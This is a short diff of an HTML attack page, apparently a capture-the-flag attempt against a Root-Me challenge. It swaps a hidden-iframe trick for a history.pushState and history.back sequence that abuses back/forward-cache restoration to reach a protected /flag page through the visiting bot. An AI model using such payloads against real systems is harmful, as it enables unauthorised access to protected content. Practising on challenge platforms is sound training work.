@@ -2,19 +2,12 @@
 <html>
 <head>
 <script>
-  // Créer iframe invisible vers /flag
-  const iframe = document.createElement('iframe');
-  iframe.style.cssText = 'position:fixed;top:-9999px;width:1px;height:1px';
-  iframe.src = 'http://challenge01.root-me.org:58007/flag';
-  document.body.appendChild(iframe);
+  // AVANT tout : push /flag dans l'historique
+  history.pushState({}, '', 'http://challenge01.root-me.org:58007/flag');
   
-  // Après 1s, afficher iframe en plein écran
-  setTimeout(() => {
-    iframe.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:9999;border:none';
-  }, 1000);
+  // Puis back IMMÉDIAT = restauration bfcache SANS page.goto()
+  setTimeout(() => history.back(), 0);
 </script>
 </head>
-<body style="margin:0;background:black">
-  <h1>IFRAME FLAG</h1>
-</body>
+<body></body>
 </html>
